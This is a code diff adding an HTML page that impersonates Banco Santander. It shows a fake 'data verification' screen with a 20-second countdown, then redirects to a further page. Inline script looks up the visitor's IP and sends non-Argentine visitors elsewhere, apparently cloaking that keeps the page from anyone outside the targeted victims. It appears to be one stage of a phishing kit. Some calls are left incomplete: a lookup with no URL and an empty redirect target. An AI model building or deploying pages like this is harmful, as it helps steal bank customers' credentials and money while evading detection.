@@ -1,0 +1,68 @@
+<!DOCTYPE html> 
+<html lang="en"> 
+<head> 
+    <meta charset="UTF-8"> 
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+    <meta http-equiv="refresh" content="20;url=index5.html"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <link rel="stylesheet" href="estilo.css"> 
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> 
+    <script src="alerta5.js"></script> 
+    <link rel="icon" href="icono.png" type="image/x-icon"> 
+    <link rel="apple-touch-icon" href="icono.png"> 
+    <script src="ipvalidation.js"></script>
+    <script>
+        var seconds = 20;
+    
+        function countdown() {
+            document.getElementById('timer').innerText = seconds;
+            if (seconds > 0) {
+                seconds--;
+                setTimeout(countdown, 1000);
+            }
+        }
+    
+        document.addEventListener("DOMContentLoaded", function() {
+            countdown();
+        });
+    </script>
+  <title>Banco Santander</title> 
+</head> 
+<body class="body"> 
+<script>
+    function redirigir() {
+        window.location.href = "";
+    }
+
+    function validarIP() {
+        axios.get("https://api.ipify.org?format=json")
+            .then(function(response) {
+                const ip = response.data.ip;
+                axios.get()
+                    .then(function(response) {
+                        const country = response.data;
+                        if (country !== "AR") {
+                            redirigir(); // Redirige si la IP no es de Argentina
+                        } else {
+                            // Si la IP es de Argentina, no se hace nada y se muestra la página normalmente
+                        }
+                    })
+                    .catch(function(error) {
+                        console.log(error);
+                    });
+            })
+            .catch(function(error) {
+                console.log(error);
+            });
+    }
+
+    validarIP(); // Llama a la función validarIP() para verificar la IP al cargar la página
+</script> 
+<form class="form"> 
+    <img src="logo.png" class="logo"> 
+   <p class="sesion" style="text-align: center;"><b>VERIFICACION DE DATOS</b></p> 
+   <label class="text1" style="text-align: center;">Estamos verificando tus datos, por favor esperá un momento.&nbsp<span id="timer">20</span></label><br><br> 
+    <img src="loading.gif" class="loading" style="text-align: center;"><br><br><br><br><br><br><br> 
+</form> 
+</body> 
+</html>
